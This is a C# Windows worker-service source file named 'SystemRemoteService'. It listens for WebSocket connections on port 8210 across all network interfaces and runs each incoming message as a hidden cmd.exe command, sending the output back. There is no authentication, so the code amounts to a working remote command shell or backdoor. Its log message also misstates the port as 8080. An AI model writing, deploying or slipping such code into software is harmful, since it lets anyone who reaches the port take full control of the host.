using System.Net;
using System.Net.WebSockets;
using System.Text;

namespace SystemRemoteService
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://+:8210/");
            listener.Start();

            _logger.LogInformation("WebSocket server started at: http://localhost:8080");

            while (!stoppingToken.IsCancellationRequested)
            {
                if (_logger.IsEnabled(LogLevel.Information))
                {
                    _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
                }

                HttpListenerContext context = await listener.GetContextAsync();

                if (context.Request.IsWebSocketRequest)
                {
                    HttpListenerWebSocketContext wsContext = await context.AcceptWebSocketAsync(null);
                    _ = HandleWebSocket(wsContext.WebSocket, stoppingToken);
                }

                await Task.Delay(1000, stoppingToken);
            }

            listener.Stop();
            _logger.LogInformation("WebSocket server stopped.");
        }

        private async Task HandleWebSocket(WebSocket socket, CancellationToken stoppingToken)
        {
            byte[] buffer = new byte[1024];
            while (socket.State == WebSocketState.Open && !stoppingToken.IsCancellationRequested)
            {
                WebSocketReceiveResult result = await socket.ReceiveAsync(buffer, stoppingToken);
                string command = Encoding.UTF8.GetString(buffer, 0, result.Count);

                string output = ExecuteCommand(command);

                byte[] response = Encoding.UTF8.GetBytes(output);
                await socket.SendAsync(response, WebSocketMessageType.Text, true, stoppingToken);
            }

            await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Conexão encerrada", stoppingToken);
        }

        private string ExecuteCommand(string command)
        {
            try
            {
                using var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {command}";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                return string.IsNullOrWhiteSpace(error) ? output : error;
            }
            catch (Exception ex)
            {
                return $"Erro ao executar comando: {ex.Message}";
            }
        }
    }
}
